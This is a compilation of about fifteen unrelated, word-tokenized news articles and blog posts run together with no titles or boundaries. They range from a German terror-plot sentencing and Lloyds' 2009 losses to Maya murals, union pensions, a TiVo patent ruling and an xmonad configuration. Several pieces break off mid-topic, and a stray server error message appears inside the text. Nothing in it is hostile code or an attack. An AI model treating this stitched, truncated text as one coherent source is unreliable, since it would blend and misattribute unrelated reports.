The government has acknowledged that sexual violence is a problem .
In a speech last week , the minister of women 's affairs said there were increasing fears of gang rape .
She suggested that increasing access to alcohol , drugs and pornography was responsible .
Social workers say that a change in attitude towards victims of sexual violence is sorely needed .
Sun Maly runs a women 's safe house in Battambang province .
" When they become victims of rape like this they become stigmatised by their own community .
Especially in the case of children - when they 've been sexually assaulted they drop out of school because of discrimination or embarrassment , " she said .
Amnesty says that that many cases are currently settled by cash payments - or not pursued because the victim cannot afford to pay police and court officials .
It is calling on the authorities to make sure that those who commit rape or sexual violence are punished through the judicial process .

A German court has sentenced four self - confessed Islamic militants to up to 12 years in jail for a failed plot to attack US targets in Germany .
In the country 's biggest terror trial in decades , a higher regional court in Duesseldorf sentenced the two German converts , Fritz Gelowicz and Daniel Schneider , to 12 years each .
Turkish national Adem Yilmaz was sentenced to 11 years , while German - Turkish citizen Attila Selek will go to jail for five years .
" You were planning a monstrous bloodbath that would have killed an unfathomable number of people , " Judge Ottmar Breidling said at the end of the trial , adding that their goal was to kill at least 150 American soldiers stationed in Germany .
" You were blinded by a strange , hate - filled notion of jihad and you turned yourselves into angels of death in the name of Islam , " Breidling said .
The four defendants in the so - called ' Sauerland ' cell had planned a " mass murder unrivaled in Germany , " said federal prosecutor Volker Brinkmann in his closing argument .
" The plot still sends chills down one 's spine .
They appointed themselves masters over life and death . "
Defense attorneys , however , called it " the largest failed terrorist attack . "
They had been asking for sentences of under ten years .
The defendants , self - confessed Islamic militants , admitted to planning large - scale bomb attacks for the Islamic Jihad Union ( IJU ) against discos and bars frequented by Americans , airports and US military facilities in Germany .
The attacks had been planned for October 2007 , during a parliament vote to extend German participation in the NATO force in Afghanistan .
Police caught the first three suspects , Daniel Schneider , Fritz Gelowicz and Adem Yilmaz , in September 2007 as they were preparing 410 kilograms of explosives – 100 times the amount used in the 2005 London bombings , prosectors said .
The fourth defendant , Atilla Selek , was later captured in Turkey .
Rainer Wendt , the head of the German Police Association , told the Bild newspaper 's online editions that the Association welcomed the verdict .
" The judgement shows that the German justice system is determined to proceed rigorously and without compromise , " Wendt said .
But he also cautioned that " one should not have any illusions that terrorists are deterred by prison sentences . "

A federal judge has imposed sanctions on the Maricopa County Sheriff 's Office for destroying evidence in a racial - profiling case , and Sheriff Joe Arpaio must answer questions regarding an immigration file he kept .
U.S. District Court Judge G. Murray
Snow 's order , released Friday , also calls on the Sheriff 's Office to try to recover e-mails that were deleted and to swear under oath to steps it took to gather the records .
The racial - profiling lawsuit was filed in December 2007 following a sheriff 's crime - suppression operation in Cave Creek that included the arrest of Manuel de Jesus Ortega Melendres .
Melendres is seeking to stop what he calls " illegal , discriminatory and unauthorized enforcement of federal immigration laws against Hispanics in Maricopa County . "
The case now includes five individuals who claim deputies have detained them because of the color of their skin , and their lawyers have sought records from the sheriff 's crime - suppression operations .
The Sheriff 's Office has denied it engages in racial profiling , but the office has acknowledged it destroyed records from those sweeps and deleted e-mails among employees regarding those operations .
Peter Kozinets , a lawyer for the plaintiffs , said the ruling would give his clients access to e-mails if they are recovered , and the Sheriff 's Office must describe in detail the measures it took to recover the electronic messages .
A key part of the order , Kozinets said , was the requirement that Arpaio answer questions about his 800 - page immigration file that was turned over in late January .
" The judge clearly recognizes in the order the ( Sheriff 's Office ) had an obligation to preserve other relevant evidence , and it destroyed the evidence , " Kozinets said .
Arpaio on Friday evening said he and his office would comply with the judge 's order .
" This is just another case .
It 's the nature of doing business , " said Arpaio , who has faced numerous state and federal lawsuits .
Arpaio said he has won 12 straight federal cases filed against him , with most coming from county - jail inmates , and he expressed confidence his office would again prevail .
A hearing is set for March 19 , when the judge will determine what additional information attorneys for the plaintiffs may seek from the sheriff based on new documents that may be produced .
One corner of the painted Maya pyramid structure at Calakmul , Mexico .
One layer of the mural must still be excavated .
Very old artworks provide a fascinating glimpse of ancient life , but not without limitations :
They typically portray the lifestyles of the rich and famous ( rulers , royals , generals , and priests ) , abandoning the masses to the mists of history .
That 's why the recent discovery of a 1,300 - year - old mural at Calakmul , Mexico , is so significant .
It is the only known pre-Columbian artwork depicting ordinary Maya engaged in everyday activities , rather than serving the wealthy .
Archaeologists first unearthed the pyramid bearing the painted exterior walls in 2004 and are still in the process of restoring it .
The murals show Maya of both sexes preparing and dispensing food , or carrying baskets , sacks , and large vessels .
( Previously discovered images mainly show men . )
The women wear face paint , and both sexes sport broad - brimmed hats , earrings , necklaces , and pendants .
Hieroglyphic captions identify some people by their trades : salt person , tobacco person , and maize - gruel person , for example .
Ramón Carrasco Vargas , of the National Institute of Anthropology and History in Campeche , Mexico , directed the excavation with two colleagues .
The trio report an intriguing observation :
The original pyramid was expanded over the centuries , but its murals were preserved with packed mud before being built over .
The Mayan builders may have had to cover the murals — you ca n’t stop progress — but they were apparently still reluctant to destroy such exceptional artwork .
This research was published in the journal Proceedings of the National Academy of Sciences .
Nonunion workers and private companies could be forced into absorbing the financial liabilities of underfunded union pension plans , thanks to pending health care mandates and an executive order that could be finalized this year , policy analysts and trade group representatives have concluded .
Even as unions continue to market themselves to new members on the basis of generous pension programs , government figures show these plans are performing poorly in comparison with retirement packages that operate beyond the orbit of organized labor .
In addition , unions are pushing the Obama administration on project labor agreements ( PLAs ) , which , among other things , will give their pension plans new sources of outside funding - nonunion workers on government contracts worth more than $ 25 million .
The average union pension has resources to cover only 62 percent of what is owed to participants , according to the Pension Benefit Guarantee Corp .
Pensions with less than 80 percent of the assets needed to cover present and projected liabilities are considered “ endangered , ” while those that fall below a 65 percent threshold are classified as “ critical ” under the Pension Protection Act of 2006 .
Pension Benefit Guarantee Corp. figures also state that less than one in every 160 workers is covered by a union pension with required assets .
Michelle Ringuette , a spokeswoman for the Service Employees International Union ( SEIU ) , acknowledged that pension funds for her union and for others were facing difficulties but said the fault lies with businesses , not the unions .
“ SEIU ’s pension funds - like all pension funds - were hit hard when the market collapsed in late 2008 .
The union is deeply concerned about the instability big banks and the high - finance industry have created in the markets and throughout our economy , and we take very seriously all threats to the retirement security of our members and people who work for a living , ” said Ms. Ringuette , who represents the nation ’s largest union by number of members .
Diana Furchtgott - Roth , a scholar with the Hudson Institute , dismissed that explanation .
“ A lot of these plans were in trouble even before the stock crash , and the members are entitled to know , ” she said , adding that “ there should be a law against putting out information about pension funds that is simply false . ”
Time lag on reports
There is often a one - to two - year delay in submitting the papers , called 5500 forms , that record the ratio of assets to liabilities on pension funds .
This means many 2008 forms , which will show the impact of the stock market drop and the recession , are just being filed and are not reflected in these and other official statistics .
Demographics are at least partially responsible for the collapse of pension assets within unionized plans , according to labor analysts .
Private - sector union membership has fallen from about 20 percent in 1980 to 7.6 percent in 2008 and 7.2 percent in 2009 , the U.S. Bureau of Labor Statistics reports .
For the first time in U.S. history , a majority of union members work for the government rather than in the private sector .
The fallback position for union leaders who need an influx of members to sustain underfunded pension plans is to push for policy changes that would coerce workers and companies into joining organized labor , Ms. Furchtgott - Roth said .
“ In countries where there is a single - payer health care plan , you find that the doctors , nurses and health aides are all government workers , and this is always a source of new union membership , ” she said .
“ If more Americans have health insurance , the demand for health care expands , as does employment in the health care field . ”
The SEIU , which has many of its members employed in health care , has been out front and center in pushing for the legislative changes to the nation ’s health care system that won congressional approval over the weekend and was signed by President Obama on Tuesday .
The SEIU home page included a section titled “ The Final Push for Health Care ” that instructed union members to call and lobby elected officials .
“ The idea here is to expand the health care centers available for unionization , and the SEIU already represents many of these providers , ” Ms. Furchtgott - Roth said .
Employees with Kaiser Permanente , the League of Voluntary Hospitals and Homes of New York , Tenet Healthcare Corp. and Dominion Hope are all represented by the SEIU and could see their ranks swell as more of the uninsured gain coverage .
SEIU shortfall
At the same time , the SEIU has engaged in a sleight of hand that is unknown to its membership , Ms. Furchtgott - Roth said .
For example , the union claims on its Web site that its 1199 pension fund , which covers SEIU workers in the New York area , is flush and well - funded , though the U.S. Labor Department says it is not .
The SEIU ’s 1199 Great New York Pension Fund in 2007 was funded only at 58 percent of its future obligations , government figures show .
Moreover , the most recent data available show that several other SEIU pension plans are strained .
The Service Employees 32 BJ North Pension Fund stands at 68 percent ; the Local 32 BJ Building Maintenance Contractors Association Pension Plan , at 41 percent ; and the 32 BJ District Building Operators Pension Trust Fund , at 56 percent .
Ms. Ringuette said the SEIU was honoring current pensions at 100 percent of the committed amounts , though she was less emphatic about future retirees .
“ Fortunately for our members , SEIU pension fund beneficiaries are whole by law , meaning none of our members and beneficiaries lost a single dime despite the economy collapsing - contrary to retirees whose 401 ( k ) s were gutted by the market failure .
What is at risk today and what we are aggressively working to correct is the accrual rates for future benefits , ” she said .
The spokeswoman said the union knows of its pension woes and has “ made sure our outside team of investment managers immediately developed a plan for recovery that was fully compliant with the Pension Protection Act . ”
“ If anything , the losses the market caused in late 2008 point to our need as a nation to address and develop a 21st - century plan for retirement security . ”
She said her union was committed to making sure that “ everyday concerns of workers are heard and addressed ” in pension reform bills .
Becker redux ?
After losing out on getting the Employee Free Choice
Act passed last year , which includes the so - called “ card - check ” legislation and binding arbitration , Katie Packer , executive director of the Workforce Fairness Institute , anticipates that Obama administration officials will pursue union favors through alternative legislation such as health care and administrative changes that include the use of executive orders .
During the AFL - CIO ’s annual meeting earlier this month , Labor Secretary Hilda L. Solis told members that the administration was contemplating a recess appointment for Craig Becker to the National Labor Relations Board ( NLRB ) .
In February , Senate Democrats failed to break a filibuster of Mr. Becker ’s nomination .
A recess appointment , if made this year , would be in effect until the start of 2012 .
Mr. Obama also could submit Mr. Becker or another nominee for that position any time during that period .
Mr. Becker , who has worked as an SEIU attorney , has suggested in his writings that major policy changes , including portions of Employee Free Choice
Act relating to the relationship between an employer and his not - yet - unionized employees , could be implemented administratively , without congressional approval .
For example , in a 1993 Minnesota Law Review article , Mr. Becker argued that traditional notions of democracy should not apply in union elections , the key phrase being , “ employers should be stripped of any legally cognizable interest in their employees ’ election of representatives . ”
He also wrote that employers should not be permitted to attend NLRB election hearings , be able to challenge election results in response to suspected union misconduct , and have their ability to communicate with workers about the downside of unionization restricted .
“ The Board should return to the principle that a union election is not a contest between the employer and the union . …
Unlike the other proposals , however , it could be achieved with almost no alteration to the statutory framework , ” he wrote .
“ Secretary Solis ’ comments indicating that labor radical Craig Becker will be appointed to the National Labor Relations Board despite bipartisan opposition to his nomination in the Senate smack of political payback , ” Ms. Packer told The Washington Times .
“ The administration is simply taking orders from Big Labor bosses , in spite of the fact that their agenda will make economic recovery impossible . ”
Return on investment
In the 2008 election cycle , labor union political action committees contributed more than $ 66 million to congressional candidates with 92 percent of those contributions going to Democrats , according to OpenSecrets.org .
Labor PACs also contributed $ 531,711 to Mr. Obama ’s campaign that year .
“ This is incredible when you think about it , after all the promises that were made , we are coming off a pretty unsuccessful year for organized labor , ” said Ben Brubeck , director of labor and federal procurement for the Associated Builders and Contractors , a trade organization for private companies .
“ After all the money they invested into electing Obama and the Democratic Congress , you would think they would get something , ” he said .
Next up after health care could be final approval of an executive order that calls for multi-employer , multi-union PLAs to be used when federal construction projects exceed $ 25 million .
PLAs stipulate that projects be awarded to contractors and subcontractors who agree to recognize unions as representing their employees during that particular job .
Although nonunion contractors are permitted to bid on PLA projects , the reality is that the projects are awarded almost exclusively to unionized contractors , critics point out .
Only 15.6 percent of the nation ’s private construction work force is unionized , Labor Department statistics show .
This means PLAs could be used to discriminate against the more than eight out of 10 construction workers who are not part of a union .
Moreover , PLAs typically require contractors to participate in multi-employer union pension plans .
This arrangement puts nonunion contractors at a financial disadvantage because they must pay for the union plan and for their existing company plan , the Associated Builders and Contractors points out in its analysis of the Obama order .
Individual workers also could lose out because they must surrender their nonunion plans and become vested with the union before receiving any benefits , the Associated Builders and Contractors argues .
Another disadvantage to private companies concerns the “ withdrawal liabilities ” they may be forced to cover as pensions erode , John R. McGowan , an accounting professor with St. Louis University , has warned in a study that examines the impact of PLAs .
Employers that are tied in with collectively bargained agreements are obligated to cover costs for underfunded union pensions when other contractors drop out , according to the study .
Tommy Vietor , the assistant White House press secretary who handles labor issues , did not respond to requests for comment on the PLA issue and the status of Mr. Becker .
The Federal Acquisition Regulation Council has not issued a final ruling on the PLA order , which may account for why it has received scant attention .
The council is responsible for issuing rules that officially enshrine executive orders into the federal procurement process .
The public comment period for the PLA rule was closed Sept. 24 .
Meanwhile , the General Services Administration has listed 10 projects across the country that could be eligible for PLAs , including three in Washington , D.C .
“ We are collectively amazed that there has been no movement on this rule yet , ” said Brett McMahon , an Associated Builders and Contractors representative who is also vice president of Miller & Long , a Maryland - based concrete construction company .
“ But because the executive order was crafted so poorly , it has raised a lot of legal questions . ”

[ an error occurred while processing this directive ] Lloyds Banking Group has announced it lost £ 24bn on bad loans in 2009 , forcing the bank heavily into the red .
The bank posted an operating loss of £ 6.3 bn - slightly less than analysts had expected and less than the £ 6.7bn loss the group made in 2008 .
On a pre-tax profit basis , the group made a profit of £ 1 bn .
The bank blamed the massive losses on commercial property loans made by Halifax Bank of Scotland ( HBOS ) , which it took over at the start of last year .
It said these " impairments " were 21 % lower in the second half of 2009 , and would continue to see a similar rate of improvement throughout this year .
Lloyds shares had lost more than 5 % by mid-afternoon trading .
' Strong momentum '
Despite the loss , the bank said total income rose by 12 % , to £ 23.9bn , while costs fell by 5 % .
I have very rarely encountered results as appallingly bad as those published by Lloyds this morning
Robert Peston , BBC business editor

It said it had " delivered a resilient trading performance against the backdrop of a marked slowdown in the UK economic environment and continued challenges in the financial markets " .
The bank said it had met mortgage lending targets for the year , but would find it " challenging " to meet targets for business lending , because firms were looking to pay off debt rather than take on more .
Looking forward , chief executive Eric Daniels said : " We are building strong earnings momentum and expect our performance to improve significantly in 2010 and beyond . "
Mr Daniels has declined to take his bonus entitlement of £ 2.3 m for 2009 .

But other staff will be paid bonuses , the bank said .
" The average salary [ at Lloyds ] is £ 25,000 a year , and the typical bonus is £ 1,000 , pre-tax , " said spokesperson Shane O'Riordain .
" We believe as a matter of principle that when stretching performance targets are met there should be some proportionate financial recognition . "
Lloyds took over Halifax Bank of Scotland ( HBOS ) in January last year .
It underestimated how many bad loans HBOS had on its books , and had to be bailed out by the government as a result .
The bank is now 41 % - owned by the state , down from 43 % after it raised £ 22.5 bn of capital at the end of last year .
Mortgage losses Lloyds pinned the blame for its huge loan losses of £ 24bn firmly on reckless lending by the previous management at HBOS , and on the recession driving other customers out of business .
It also revealed the massive scale of further potential losses lurking on its books because borrowers are struggling to repay their loans .

What it described as " impaired loans and advances " more than doubled in value last year and stood at £ 58.8 bn by the end of December - amounting to 9 % of all its lending .
The bank said losses crystallised last year were mainly due to " falls in the value of commercial real estate and the impact of the economic deterioration during the year , including the effects of rising unemployment and reduced corporate cash flows " .
In its High Street business , higher unemployment among customers pushed up losses on bad loans to £ 4.3bn , although losses on mortgages fell back as house prices recovered .
In corporate lending , losses rose to £ 15.7bn , particularly because of the crash in commercial property values and because of other firms going under .
Lloyds also lost large sums on commercial property loans in Ireland and Australia .
On Thursday , Royal Bank of Scotland ( RBS ) , which is 84 % government - owned , reported a loss for 2009 of £ 3.6 bn .
Last week , Barclays reported pre-tax profits of £ 11.6bn , although the figure was boosted by the sale of its BGI fund management arm to US firm BlackRock last year .

SAN FRANCISCO ( Reuters ) - A federal appeals court affirmed on Thursday a contempt finding against Dish Network Corp and EchoStar Corp in their long - running patent case against digital video recorder maker TiVo Inc , sending TiVo shares soaring 52 percent .

The U.S. District Court for Eastern Texas had previously imposed contempt sanctions against sister companies Dish and EchoStar for violating a court - ordered permanent injunction to stop making and selling DVRs .
TiVo had sued EchoStar back in 2004 , and a jury found that its DVR technology infringed TiVo patents .
Analysts hailed the ruling as a huge win for TiVo , one that potentially opens up major new market and licensing opportunities .
TiVo ’s options volume heated up to 14 times the norm in afternoon trading .
In all , about 191,000 calls and 75,000 puts had traded , according to option analytics firm Trade Alert .
Janney Montgomery Scott analyst Tony Wible recommended that clients “ buy the stock aggressively up to $ 15 . ”
“ Today ’s overwhelming victory significantly improves TiVo ’s ability to win new business and the rates it can demand for its technology from future deals , while also improving penetration of its DVR advertising platform , ” he wrote in a research note .
He said the ruling should also help TiVo in its litigation against AT&T Inc , Verizon Communications Inc , and Microsoft Corp .
TiVo said it was pleased with the appeals court ruling , and said it paves the way for the company to receive $ 300 million in damages and contempt sanctions awarded to it for EchoStar ’s infringement through July 1 , 2009 .
TiVo said it plans to seek further damages and contempt sanctions for infringement after July 1 .
HURTING DISH
Bernstein Research analyst Craig Moffett said the court decision could lead to the complete disablement of as many as 8 million Dish DVRs , and said the company now has little leverage in any settlement negotiations with TiVo .
“ The ruling opens the door for TiVo to now negotiate a commercial settlement with Dish with the proverbial gun to the head , ” he wrote in a research note .
Moffett said he expects a much higher settlement on DVR licensing fees than the historical precedent of $ 1 to $ 2.25 per unit a month .
Dish was spun out of EchoStar in 2008 .
Dish and EchoStar claimed they had modified some components of the DVRs Dish continued to sell so that they would no longer infringe TiVo ’s patents .
In a statement , the companies expressed disappointment with the appeals court ruling , made by a three - judge panel , and said they will seek a review by the full court .
Dish and EchoStar said their DVR customers are not affected by the ruling , and said they will propose “ new design - around ” DVR technology to the district court for approval .
Shares of Alviso , California - based TiVo were up 52 percent at $ 15.52 in afternoon trading on the Nasdaq .
Shares of Dish Network were down 4.4 percent at $ 20.75 .
The case is TiVo Inc vs Echostar Corporation , Case No. 2009 - 1374 , United States Court of Appeals for the Federal Circuit .

This just in : people lie .
Human beings lie all the damned time , it happens so often you might consider it just part of the psychology of humanity .
The best part is that we often lie about the most inane shit and do n’t even question it .
Men and Women stretch the truth in any number of ways , especially in personal ads and on dating websites , and the things they lie about are often hilarious .
Women lie most about their age .
Men ?
They lie about their height .
Let that sink in for a second .
Why the hell would you lie about your age or your height ?
What is the point ?
Anyone interested in you is going to figure it out sooner or later !
Did you really think they would n’t notice that you ’re just below the minimum height to ride the tea-cups at the local fair after your dating profile said you were a cool 6 ’ 2 ″ ?
The point is , everyone ’s trying to impress everyone else ; to stretch the truth and make themselves seem totally awesome so other people will like them .
The problem with this mentality is that it does n’t last forever .
Sooner or later people figure out that not only are you height - challenged , an ancient crone , or a douchebag , they also find out you ’re a liar too .
But hey , it ’s worth it for that short amount of attention , right ?
Real - life musings aside , its always interesting to examine the creatures and beings that populate the realm of myth in different ways .
We ’ve always had creatures , both large and small , to look out for and be wary of .
There are people today that legitimately fear the chupacabra , popobawa , various ghosts , and a great deal more .
If you were to ask those very same people if they are afraid of giants , however , you ’d probably be laughed at .
As the world has become progressively more connected and our awareness of the landscape has increased , it seems there ’s no more room in our subconscious minds for giants and large monsters .
The truth is that none of these things probably existed .
They always populated the dark and terrifying corners of the earth , places we could not possibly delve into .
Giants and their ilk are just too damned big , they ’d be spotted in an instant nowadays by myriad airplanes flying overhead .
Along with giants , we seem to pay no heed to other monstrous creatures .
Dragons , thunderbirds , and manticores , along with many others , have just gone out of style , while other mythical creatures retain some or all of the supernatural charm that captivated the minds of our ancestors .
Even now , there are places in Ireland dedicated as santuaries to the Little People and spots held sacred in South America due to the presence of some god or monster .
I guess that ’s the interesting thing .
All of these things were brought forth by human imagination and they deserve a second look today .
They ’re all important and sacred in some way , even if its not a literal one .
Besides , I guess everyone needs a little love , even giants that lie about their height .
Schools , classrooms , corridors and cafeterias in Berkeley are buzzing with excitement over the March 4 Day of Action in California .
An idea born out of the Oct. 24 education conference at the UC Berkeley campus , Thursday ’s rally has evolved into a statewide movement to protest budget cuts , fee hikes and furloughs in public education .
“ We see the rally as an important first step that for the first time brings all of education together in one protest , ” said Joan Berezin , who teaches Global Studies at Berkeley City College .
“ In the past we have fought group by group — K - 12 , community colleges , CSUs and UCs .
That has often resulted in the politicians playing us off against each other .
We want to make sure that we are all seen and heard -- that the politicians all over California get the message that these cuts are not okay . ”
Berkeley City College students plan to march throughout their building at noon Thursday and then take a bus or the BART over to the Civic Center in San Francisco , where a rally is scheduled to begin at 5 p.m .
Berezin , who will speak at the rally , said many of the students who were organizing around the budget cuts had never done anything like that before .
“ We hope that we are training a new generation of organizers and activists , ” she said .
Over the last few months , BCC students and teachers have gone out to churches , unions , schools , farmers ’ markets , BART stations and hospitals to educate the community about how the cuts were affecting public education .
Marc Lispi , who teaches English at Berkeley City College , said the rally in San Francisco was being held at 5 p.m. to give everybody a chance to participate .
“ We could have pushed for the rally earlier in the day , but then that would have forced teachers and workers to either take the day off , call in sick or go on strike , none of which most people are willing to do , ” he said .
“ And it would basically mean that most of K - 12 would not attend .
So it is in the evening , after school and after work to have the greatest turnout . ”
Dozens of classes have been cut throughout the Peralta College district , part - time teachers , counselors and custodians laid off and bus routes slashed , making it difficult for students to get to college .
“ This was by far the most crowded first weeks of classes ever , with some classes having 20 to 30 additional students because other sections had been cut , ” Lispi said .
“ Many students just did n't get the classes they needed . ”
The situation is just as bleak at UC Berkeley , which is planning its own rally at noon at Sproul Plaza .
From there students will march to Frank Ogawa Plaza in Oakland , where UC President Mark Yudof has his office .
“ We expect pretty much anyone interested in keeping up with the issue of public education in California to be there , ” said Sue Le Jue , a lecturer of physical education in Berkeley .
“ This is not just about UC , it ’s about everyone .
The state of California is funding money for prisons instead of education .
There ’s a lot at stake right now .
We need transparency in the UC budget , a change in priorities at UC and in the entire state of education .
You ca n’t keep building buildings and laying people off . ”
A protest against an expansion of Durant Hall last Thursday turned violent when an angry crowd went into the streets and set trash cans ablaze , even breaking the glass windows of a sandwich shop .
UC Berkeley administration , faculty and students have condemned the incident , which led to two arrests .
“ The real fight is in Sacramento , ” said Nik Dixit , an undergraduate student at UC Berkeley and Policy Director of Cal Berkeley Democrats .
“ That ’s where the budget cuts are being made , and that ’s where solutions must be found .
I personally believe that violent protesters are criminals and do n’t represent the student population .
We support non-violent protest .
These protesters are delegitimizing the thousands of students who are speaking out every day . ”
Dixit and other students are also gearing up for the rally .
Students are expected to form picket lines at all the entrances on campus from 7 a.m. to noon .
Cathy Campbell , President of the Berkeley Federation of Teachers , said teachers from the Berkeley public elementary and middle schools will be leafleting at their school sites in the morning and gathering outside district headquarters at 2132 Martin Luther King Jr. Way around 3:30 p.m. to answer questions about the cuts .
Berkeley Unified School District has slashed $ 8 million over the last two years and is facing a $ 2.7 million deficit in the 2010 - 2011 fiscal year .
All teachers on temporary contracts have been released .
Campbell said she was concerned about further cuts to the Berkeley Adult School , which lost $ 1.5 million last year .
Rally organizers said they were hopeful the protest would remain peaceful .
“ At this point the biggest worry is the weather , ” Berezin said .
“ We hope it will cooperate . ”

Prostate specific antigen , or PSA is a protein produced by the prostate that is found in semen 2 .
Measuring PSA levels is an important component to detecting possible signs of prostate cancer .
High PSA levels in your blood could be a warning sign of an issue with your prostate .
Normal PSA
PSA tests reveal the amount of PSA detected in the blood .
According to the National Cancer Institute , a PSA level below 4.0 ng/ mL is considered normal .
Breads

A September , 2006 " Urology " journal study of 29 Australian men with prostate cancer found that those who ate ate wheat bread saw a rise in PSA levels of 40 percent .
Conversely , the men who ate soy - enriched bread had a drop in their PSA levels of 12.9 percent .
Dairy Products
A randomized , double - blind , placebo - controlled trial conducted by researchers at Harvard University that began in 1982 called the Physician 's Health Study reviewed more than 20,000 male physicians over 11 years and concluded that there was a moderate increase in prostate cancer risk associated with increased consumption of dairy products .

Eating red meat five or more times per week can raise your PSA levels and possibly double your risk for prostate cancer , according to researchers at the Project to End Cancer .
Foods to Lower PSA Levels
According to the Mayo Clinic , eating a diet rich in whole grains , fruits and vegetables -- including tomatoes and broccoli , which contain antioxidants -- may help lower PSA levels and decrease your risk of developing prostate cancer .
NOT too long ago , a magazine in Manhattan invited me , by e-mail , to interview for a job .
After meeting with me , the managing editor and the director of human resources asked me to take home the standard editing test and return it ASAP .
I dutifully obliged .
And then I waited .
One day .
Two days .
A week .
A month .
Two months .
Three ... well , you get the picture .
Not only was there no word on whether I would be offered the job -- nobody at the magazine even bothered to e-mail me to say that my completed test had been received !
Back in the good old days , people used to duck your phone calls .
Or just not return them .
But in this , the electronic era , a whole new brand of disdain has come into vogue .
The age of the e-snub is upon us .
I have grown weary of this kind of '' dissing . ''
People who seem to go blind , mute and limp when all you are seeking are a few keystrokes in reply .
Prospective employers whose computers appear to crash when asked to give something resembling a definitive answer , one way or the other .
Annoying e-mail messages plague all of us , but those of a more legitimate nature are surely deserving of a simple reply .
Unfortunately , basic e-courtesy is in short supply .
So , having been burned in the past by e-boors , I decided that enough was enough .
The magazine had left me in limbo .
I was going to have my revenge .
Sitting down at my computer one morning , I e-mailed the managing editor to say that I had happily accepted the job .
More specifically , I wrote that I was '' delighted to learn that I will be joining the editorial team ! ''
I went on to say that '' the salary and vacation are fine and I will report for duty bright and early Monday morning . ''
Whereupon , after the prolonged cold shoulder I had received , I was immediately bombarded with urgent e-mail messages , accompanied by the online equivalent of bells and whistles -- the red exclamation point .
Urgent messages were left on my answering machine , demanding that I call Human Resources at once .
It was just too delicious .
When I finally did call back , the H.R. director was beside herself .
'' Who authorized this ? '' she demanded breathlessly .
'' Who was it that told you ?
There must have been some mistake .
Nobody cleared this with me .
I do n't get it . ''
'' Well , '' I said sweetly , '' I spoke to the editor in chief and he told me I 've been hired , so I 'll be there first thing Monday .
And , let me tell you , I am truly excited about joining your team ! ''
'' But ... but ... but ...'' she sputtered .
Finally , I let the cat out of the bag .
'' Listen , lady , '' I told her , '' when you ask someone to come in for an interview , take a test and physically return it to you , and you can't be bothered after three months to let that person know where he or she stands , much less acknowledge even receiving the test back , you are nothing but rude , thoughtless , unprofessional amateurs . ''
Huffily , she started to give me the stock speech about '' our hiring procedures , '' until I abruptly cut her off with the appropriate barnyard epithet .
Then I barked : '' Do you get it now ?
Well , do you ? ''
Meekly , she conceded , '' Yes , I get it . ''
No , I did not get the job .
But there have been other satisfactions -- most notably , the kudos of other slighted job seekers when I relate the tale .
Having been subjected to similar indignities , they tell me they love it , absolutely love it .
In fact , it 's been something on the order of a collective cheer .
DRAWING ( DRAWING BY P.C. VEY )
TOKYO ( Reuters ) - Japan will not comply if a total ban on international trade in Atlantic bluefin tuna is imposed , a government official was quoted as saying on Thursday , as support grows for the unprecedented trade halt .
Bluefin tuna is a highly valued fish worth up to $ 200 - $ 300 per kg but stocks have depleted rapidly .
It is particularly sought - after in Japan , where a single fish can fetch as much a $ 100,000 .
“ If worse comes to worst , Japan will have no choice but to lodge its reservations , ” Senior Vice Minister of Agriculture , Forestry and Fisheries , Masahiko Yamada , was quoted as saying by Kyodo news agency .
Some 175 countries are due to vote on 40 proposals at a meeting of the Convention on International Trade in Endangered Species ( CITES ) in Doha , Qatar , on March 13 - 25 .
The proposals include whether to list bluefin tuna as endangered .
Monaco had proposed protecting bluefin tuna by listing it under appendix I of the CITES .
A two - thirds majority is required for it to be accepted and Japan is expected to fight hard against the ban .
France and Italy have also recently reversed their opposition to a ban .
The European Union ’s executive said last month that Atlantic bluefin tuna should be protected from being pushed to extinction by Japanese sushi lovers .
This was a mad dash to complete .
I lost enthusiasm the first week , got annoyed at snow the second week , got sick the third , and then basically when balls to the wall in the fourth week .
I originally was not pleased , but the second to last day I went crazy , extended a bunch of songs , added vocals , and now I ’m actually really proud of my effort .
Whoo !

Nearly three years ago , Spencer Janssen and I started work on xmonad , a tiling window manager for unix that would do what we want , automatically , so we could just concentrate on hacking code , without the window manager getting in the way .
The project ’s been quite successful — the most downloaded app on Hackage for the last couple of years , and thousands of users .
It even has its own twitter , blog , reddit and facebook accounts .
Originally I thought of this project something as the anti-GNOME : small , learn , and every part just does one thing only , but well – in the Unix tradition .
And it has stayed lean .
Around two thousand lines of Haskell for the core system , but with the benefit of hundreds of extensions in the contributor ’s library — everyone ’s config file is potentially a library module new users can import .
Over the years , GNOME and xmonad have started playing well together to the point that there ’s relatively seemless interop between the two projects : you can use the full GNOME environment , and swap in xmonad as your window manager , or use a minimal environment with xmonad , adding in GNOME tools that help you .
Playing well with others is good for your open source software .
I ’ve now finally switched my xmonad configuration to use a number of gnome apps , to support the core dynamic tiling provided by xmonad .
Here ’s my config file :
import XMonad import XMonad .
Config .
Gnome import XMonad .
Layout .
NoBorders main = xmonad gnomeConfig { terminal = " term " , layoutHook = smartBorders ( layoutHook gnomeConfig ) }
Yeah , that ’s it .
import XMonad .
Config .
Gnome , add smart borders , and overide the terminal to be my urxvt wrapper .
xmonad is configured in Haskell , or languages Haskell can interoperate with .
My session is started up from .xinitrc as :
gitit & gnome - panel & gnome - power - manager & dbus - launch -- exit - with - session xmonad
I use gitit as my personal wiki , and then put a few things in the gnome - panel .
I ’m really happy with how easy it now is to use xmonad with all the regular GNOME apps that people would like to see .
This kind of friendliness to the dominate tools of the day is good for the project — and good for our users .
The introduction of Apple 's iPad predictably divided gadget fans into " love it " and " hate it " camps .
The haters say iPad lacks multitasking , a webcam , Flash support , a USB port , massive storage , a removable battery , CD and DVD support , RAM upgradability , multiple OS support and other features .
The lovers are less clear about why they want one .
So allow me to propose the same list as above .
It works just as well .
The iPad is desirable for what it does n't do -- ca n't do -- as much as for what it can do .
A strange trend has emerged that violates the more - is - better ethos of American consumer culture .
Some products and services are touting limitations as desirable " features . "
And consumers are loving it .
This strikes some as Orwellian doublespeak : " War is peace . "
" Freedom is slavery . "
" Less is more . "
But the truth is that people do n't buy consumer electronics for the quantity of features .
They buy it for the quality of experience .
For technical users , having more features means a better experience .
So - called power users are harassed and annoyed by limitations , by the inability to do something they want to do .
They feel a thrill when they 're empowered to do some useful new thing .
But for most users , having more features degrades experience .
People suffer information overload and its ugly cousin , runaway gadget complexity .
They 're harassed and annoyed , not by limitations , but by features they can't find or figure out , and by problems they do n't understand .
They feel a thrill when gadgets perform basic tasks without fail or hassle .
The vast majority of ordinary PC users I 've talked to have problems on their PCs , laptops and netbooks that bother them greatly but they cannot fix .
The sound card is n't working right .
I can't make this dialog box go away .
Why can't I print ?
Gadget overcomplexity does n't exist in a vacuum .
